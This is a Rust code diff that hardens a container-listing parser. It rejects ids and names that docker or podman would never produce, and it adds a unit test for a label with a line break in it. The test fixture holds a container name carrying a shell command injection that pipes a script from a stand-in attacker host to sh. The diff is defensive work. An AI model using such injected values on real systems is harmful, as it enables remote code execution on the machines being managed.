@@ -82,6 +82,15 @@ pub fn list(target: &Target, env: &SshEnv) -> Result<ContainerList, OpError> {
     Ok(parse(&String::from_utf8_lossy(&out)))
 }
 
+fn is_container_id(id: &str) -> bool {
+    (1..=64).contains(&id.len()) && id.bytes().all(|b| b.is_ascii_hexdigit())
+}
+
+/// What docker and podman accept as a name: `[a-zA-Z0-9][a-zA-Z0-9_.-]*`.
+fn is_container_name(name: &str) -> bool {
+    name.bytes().next().is_some_and(|b| b.is_ascii_alphanumeric()) && name.bytes().all(|b| b.is_ascii_alphanumeric() || b"_.-".contains(&b))
+}
+
 pub fn parse(text: &str) -> ContainerList {
     let mut list = ContainerList::default();
     let mut engine: Option<Engine> = None;
@@ -102,12 +111,19 @@ pub fn parse(text: &str) -> ContainerList {
         let Some(e) = engine else { continue };
         let f: Vec<&str> = line.split('\t').collect();
         if f.len() >= 6 {
+            let name = f[1].split(',').next().unwrap_or(f[1]).trim();
+            // A label with a line break in it (an image can set one) makes up a
+            // line of its own; ids and names docker and podman really give
+            // never hold anything a shell would act on.
+            if !is_container_id(f[0].trim()) || !is_container_name(name) {
+                continue;
+            }
             let id: String = f[0].chars().take(12).collect();
             let state = f[3].trim().to_lowercase();
             list.containers.push(Container {
                 engine: e,
                 id,
-                name: f[1].split(',').next().unwrap_or(f[1]).trim().to_string(),
+                name: name.to_string(),
                 image: f[2].trim().to_string(),
                 running: state == "running",
                 state,
@@ -198,6 +214,16 @@ permission denied while trying to connect\n";
         assert!(!l.containers[1].running);
         assert_eq!(l.problems.len(), 1);
         assert!(l.problems[0].contains("usermod"));
+    }
+
+    #[test]
+    fn a_label_with_a_line_break_makes_no_container() {
+        // An image's compose label, printed raw, ends one line and makes up another.
+        let out = "@engine docker\n\
+abc123def4567890\tweb\tnginx\trunning\tUp 2 hours\t\tx\n\
+0123456789ab\tapi;curl -fsSL https://evil.example/p|sh;#\tnginx\trunning\tUp 2 hours\t\t\n";
+        let l = parse(out);
+        assert_eq!(l.containers.iter().map(|c| c.name.as_str()).collect::<Vec<_>>(), ["web"]);
     }
 
     #[test]
